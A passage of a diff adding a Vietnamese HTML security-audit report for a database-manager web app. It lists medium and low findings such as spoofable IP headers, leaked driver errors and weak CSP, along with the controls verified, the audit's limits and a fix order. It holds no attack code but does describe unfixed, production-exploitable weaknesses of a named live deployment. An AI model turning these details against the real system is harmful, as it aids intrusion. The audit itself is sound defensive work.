+    <strong>không xác thực danh tính máy chủ</strong> — kẻ đứng giữa dựng chứng chỉ tự ký là
+    đọc được toàn bộ. Tốt hơn V-02 nhưng vẫn không phải bảo vệ thật.
+    <em>Đề xuất:</em> đặt <code>DB_SSL_STRICT=true</code> ở production và ghi rõ trong tài liệu deploy.</p>
+</div>
+
+<div class="f med">
+  <div class="hd"><span class="tag med">Medium</span><span class="id">V-06</span>
+    <h3>Route <code>query</code> trả nguyên văn lỗi driver</h3></div>
+  <pre><code>// query/route.ts:96-97
+const msg = e instanceof Error ? e.message : "Query failed";
+return jerr("QUERY_FAIL", msg, 500);   // ← khong che giau</code></pre>
+  <p>Mọi route khác đều che (<code>rows</code>, <code>bulk</code>, <code>export</code>… chỉ trả
+    thông báo chung và log nội bộ). Riêng route này rò tên bảng/cột, đường dẫn, phiên bản DB
+    ra client — hữu ích cho người dò tìm.</p>
+  <p><strong>✅ Đã sửa (chưa deploy).</strong> Áp dụng cùng khuôn <code>isValidation</code> như
+    <code>rows/route.ts</code>: lỗi cú pháp SQL và timeout vẫn hiện (người dùng cần chúng để sửa câu
+    lệnh của chính mình), lỗi driver bị che và chỉ log server-side.</p>
+</div>
+
+<div class="f med">
+  <div class="hd"><span class="tag med">Medium</span><span class="id">V-07</span>
+    <h3>Audit log có thể bị đầu độc qua header giả</h3></div>
+  <p><code>getClientIp</code> tin <code>cf-connecting-ip</code> → <code>x-forwarded-for</code> →
+    <code>x-real-ip</code> mà không kiểm nguồn.</p>
+  <p><strong>Xác nhận: khai thác được trên production.</strong> Ban đầu tôi nghĩ firewall Cloudflare-only
+    sẽ vô hiệu hoá lỗi này — nhưng V-11 cho thấy origin mở với toàn Internet, nên
+    <code>cf-connecting-ip</code> hoàn toàn giả mạo được, và <code>REQUIRE_CLOUDFLARE=false</code>
+    nên app cũng không chặn.</p>
+  <p><strong>Không</strong> phải lỗ hổng vượt rate limit — rate limit khoá theo <code>email</code>,
+    thiết kế này đúng. Thiệt hại nằm ở chỗ audit log mất giá trị đúng lúc cần điều tra.
+    <em>Đề xuất:</em> chỉ tin <code>cf-connecting-ip</code> khi <code>REQUIRE_CLOUDFLARE=true</code>,
+    còn lại dùng địa chỉ socket.</p>
+</div>
+
+<div class="f med">
+  <div class="hd"><span class="tag med">Medium</span><span class="id">V-08</span>
+    <h3>CSP có <code>script-src 'unsafe-inline'</code></h3></div>
+  <p>Phần còn lại của CSP rất chặt (<code>object-src 'none'</code>, <code>frame-ancestors 'none'</code>,
+    <code>connect-src 'self'</code>). Nhưng <code>unsafe-inline</code> khiến CSP mất tác dụng như
+    lớp chặn XSS — đáng lưu ý vì ứng dụng hiển thị <em>dữ liệu lấy từ DB của người dùng</em>.
+    <em>Đề xuất:</em> chuyển sang nonce-based CSP (Next.js hỗ trợ qua middleware).</p>
+</div>
+
+<div class="f low">
+  <div class="hd"><span class="tag low">Low</span><span class="id">V-09</span>
+    <h3><code>Content-Encoding: gzip</code> gắn cứng cho mọi <code>/api/*</code></h3></div>
+  <p><code>next.config.mjs</code> khai báo header này tĩnh cho tất cả API response, kể cả response
+    không hề được nén. Client nào tôn trọng header sẽ giải nén một luồng không nén và lỗi.
+    Đây là lỗi <em>đúng đắn</em> hơn là bảo mật, nhưng dễ biểu hiện thành sự cố khó truy.
+    <em>Đề xuất:</em> bỏ dòng này, để runtime tự đặt.</p>
+</div>
+
+<div class="f low">
+  <div class="hd"><span class="tag low">Low</span><span class="id">V-10</span>
+    <h3>Rate limit fail-open, không chia sẻ giữa instance</h3></div>
+  <p>Redis lỗi → rơi về bộ đếm in-memory (<code>rateLimit.ts:66</code>). Đây là đánh đổi
+    <em>có chủ ý và đã ghi comment</em> (ưu tiên khả dụng). Cần biết hệ quả: chạy N instance thì
+    hạn mức thực tế nhân lên N lần. Với deploy hiện tại (1 container) thì chưa ảnh hưởng —
+    ghi lại để không quên khi scale ngang.</p>
+</div>
+
+<h2>6. Những phần đã kiểm và thấy tốt</h2>
+<ul class="ok-list">
+  <li><span class="tag ok">OK</span> <strong>Phủ sóng xác thực:</strong> cả 26 route đều gọi
+    <code>authorize()</code>/<code>authorizeUser()</code>. Chỉ <code>/api/auth/*</code> và
+    <code>/api/health</code> mở — đúng chủ ý.</li>
+  <li><span class="tag ok">OK</span> <strong>Cách ly tenant:</strong>
+    <code>getConnectionRecord(id, email)</code> luôn kèm email chủ sở hữu — không có đường
+    đọc record của người khác bằng cách đoán UUID.</li>
+  <li><span class="tag ok">OK</span> <strong>Vault:</strong> AES-256-GCM, khoá dẫn xuất bằng HKDF,
+    salt + IV ngẫu nhiên mỗi bản ghi, có hỗ trợ xoay khoá (<code>VAULT_MASTER_SECRET_OLD</code>).</li>
+  <li><span class="tag ok">OK</span> <strong>SSRF:</strong> <code>ensureSafeHost</code> chặn IPv4/IPv6
+    private, và <code>resolvedIp</code> được ghim lại để chống DNS-rebinding — chi tiết thường bị bỏ sót.
+    Runtime xác nhận <code>ALLOW_PRIVATE_HOSTS=false</code>.</li>
+  <li><span class="tag ok">OK</span> <strong>Cách ly cổng:</strong> container chỉ bind
+    <code>127.0.0.1:9230</code>, không phơi ra ngoài — nếu không, V-11 đã còn tệ hơn nhiều.</li>
+  <li><span class="tag ok">OK</span> <strong>Quản lý secret:</strong> secret nằm trong
+    <code>/app/.env.production</code> quyền <code>600</code>, không nằm trong env container
+    (không rò qua <code>docker inspect</code>), không có secret nào bị commit vào git.</li>
+  <li><span class="tag ok">OK</span> <strong>UFW default policy:</strong> <code>DEFAULT_INPUT_POLICY="DROP"</code>
+    — nền tảng đúng; vấn đề của V-11 nằm ở các rule allow, không phải ở chính sách mặc định.</li>
+  <li><span class="tag ok">OK</span> <strong>CSRF:</strong> <code>originOk()</code> fail-closed khi
+    <code>AUTH_URL</code> chưa cấu hình; đường PAT bỏ qua CSRF một cách chính đáng (bearer không tự gửi).</li>
+  <li><span class="tag ok">OK</span> <strong>PAT:</strong> lưu dạng SHA-256, không lưu bản rõ; route
+    quản lý token đặt <code>sessionOnly</code> nên PAT rò rỉ không tự nhân bản được.</li>
+  <li><span class="tag ok">OK</span> <strong>Mutation:</strong> UPDATE/DELETE bắt buộc confirm-token
+    gắn với đúng payload, bắt buộc có WHERE, và tự ghi backup trước khi xoá.</li>
+</ul>
+
+<h2>7. Giới hạn của lần rà soát này</h2>
+<div class="note">
+  <p>Nêu rõ để không ai đọc bản này như một chứng nhận sạch:</p>
+  <ul>
+    <li><strong>Không có khai thác nào được thực hiện.</strong> Kịch bản V-01/V-03 là suy luận từ hành vi
+      driver đã kiểm chứng trong code, chưa được chứng minh bằng một request tấn công thật.
+      Riêng V-11 <em>có</em> bằng chứng trực tiếp (rule firewall + <code>curl</code> trả 200).</li>
+    <li><strong>Kiểm tra V-11 được thực hiện từ chính máy chủ</strong>, nên nó chứng minh nginx phục vụ
+      vhost khi bị gọi thẳng bằng IP. Việc một host <em>bên ngoài</em> tới được cổng đó là suy ra từ
+      rule <code>ALLOW Anywhere</code> — chưa test từ mạng ngoài. Kết luận vẫn vững ở tầng packet filter,
+      nhưng đây là suy luận chứ không phải quan sát.</li>
+    <li><strong>Chưa audit dependency.</strong> <code>npm audit</code> không chạy được vì ổ C: của máy
+      thao tác <strong>còn 0 GB</strong>. Đây là mảng còn trống, không phải mảng đã sạch.</li>
+    <li>Chưa soát <code>e2e/</code>, thư mục <code>cli/</code>, và nội dung cấu hình nginx phía host.</li>
+    <li>Không đọc giá trị của bất kỳ secret nào — chỉ kiểm tra có/không và độ dài.</li>
+  </ul>
+</div>
+
+<h2>8. Thứ tự xử lý đề nghị</h2>
+<ol>
+  <li><strong>V-11 (firewall)</strong> — ảnh hưởng rộng nhất (12+ site). Đã điều tra xong, chốt
+    <strong>phương án B</strong>: xoá 2 rule catch-all IPv6 (an toàn, có bằng chứng log), rồi chặn theo
+    dải Cloudflare ở tầng nginx cho các vhost proxied. Giữ nguyên 2 rule IPv4 vì
+    <code>mcp.zerocodefee.com</code> thật sự cần. Kèm theo: bật <code>REQUIRE_CLOUDFLARE=true</code>
+    cho DBManager (1 dòng, làm được ngay).</li>
+  <li><strong>V-01</strong> — bỏ <code>allowShare</code> ở <code>query</code> và <code>ai-sql</code>.
+    Sửa một dòng, chặn được đường leo thang nghiêm trọng nhất trong ứng dụng.</li>
+  <li><strong>V-02 + V-05</strong> — thêm nhánh TLS cho PostgreSQL, bật <code>DB_SSL_STRICT=true</code>,
+    sửa tài liệu cho khớp hành vi thật. Đã xác nhận đang sống.</li>
+  <li><strong>V-04</strong> — enforce <code>ctx.readonly</code> để V-01 không tái diễn dưới dạng khác.</li>
+  <li><strong>V-03</strong> — DB user chỉ-SELECT cho đường share; sửa chữa cấu trúc, cần thiết kế.</li>
+  <li>V-06 → V-10 xử lý theo đợt bảo trì thường.</li>
+</ol>
+
+<h2>9. Phụ lục — hai gate của chính harness đang hỏng</h2>
+<p>Không phải lỗ hổng bảo mật, nhưng cùng một loại bệnh: cơ chế bảo vệ <em>tồn tại</em> mà không hoạt động.
+  Cả hai phát hiện trong lúc chạy audit này, và cả hai đã sửa.</p>
+
+<div class="f med">
+  <div class="hd"><span class="tag med">Đã sửa</span><span class="id">H-A</span>
+    <h3><code>.gitattributes</code> thiếu rule <code>*.py</code> → bundle integrity đỏ trên mọi clone</h3></div>
+  <p>Harness đóng gói các check của nó dưới dạng Python trong <code>.harness/scripts/lib/</code>.
+    <code>.gitattributes</code> có rule LF cho <code>*.sh</code>, <code>*.yml</code>, Dockerfile —
+    nhưng <strong>không có cho <code>*.py</code></strong>. Với <code>core.autocrlf=true</code> trên
+    Windows, git ghi các file đó thành CRLF lúc checkout, hash đổi, và
+    <code>harness doctor</code> báo:</p>
+  <pre><code>[FAIL] bundle integrity  31 of 98 bundled script(s) no longer match the v1.6.18 receipt</code></pre>
+  <p>Thông báo đó đổ lỗi cho "có thứ gì đó ghi đè script sau khi cài" — sai hướng hoàn toàn.
+    Script chưa bao giờ bị sửa; chỉ line ending bị đổi. Và vì working tree của người phát triển
+    <em>nhìn vẫn sạch</em> (local pass, clone fail), lỗi này gần như không thể chẩn đoán nếu chỉ
+    nhìn từ máy mình. Xác minh bằng clone sạch: cùng file, hash khác nhau, chỉ khác CRLF.</p>
+  <p><strong>Đã sửa:</strong> thêm <code>*.py text eol=lf</code> + <code>git add --renormalize .</code>.</p>
+</div>
+
+<div class="f med">
+  <div class="hd"><span class="tag med">Đã sửa</span><span class="id">H-B</span>
+    <h3><code>harness doctor --strict</code> trong CI không bao giờ có thể xanh</h3></div>
+  <p>Job <code>doctor</code> của <code>harness-gate.yml</code> chạy với <code>--strict</code>, tức là
+    một dòng FAIL sẽ làm hỏng build. Nhưng doctor kiểm tra <em>bằng chứng runtime</em> — hash-chain
+    ledger, telemetry report — và đúng những file đó nằm trong <code>.gitignore</code> (chúng churn theo
+    mọi tool call, gitignore là quyết định đúng). CI checkout ⇒ không có bằng chứng ⇒ FAIL, mãi mãi.</p>
+  <p>Đây là C14 áp lên chính công cụ thực thi C14: một gate luôn đỏ dạy người ta bỏ qua màu đỏ, và
+    khoản đó đắt hơn giá trị mà check này từng mang lại.</p>
+  <p><strong>Đã sửa:</strong> bỏ <code>--strict</code> ở job đó (giữ advisory). Ba job còn lại —
+    policy-ci, golden, secret-scan — kiểm tra thứ <em>thật sự nằm trong git</em> và vẫn chặn build.
+    Bằng chứng runtime được assert ở nơi nó tồn tại: local và pre-push.</p>
+</div>
+
+<footer>
+  Rà soát tĩnh source tại commit <code>8cdfbb0</code>, 2026-08-18.
+  Không có khai thác nào được thực hiện lên hệ thống đang chạy.
+  Các mục đánh dấu Critical cần xác nhận cấu hình runtime trước khi lên lịch xử lý.
+</footer>
+
+</div>
+</body>
+</html>
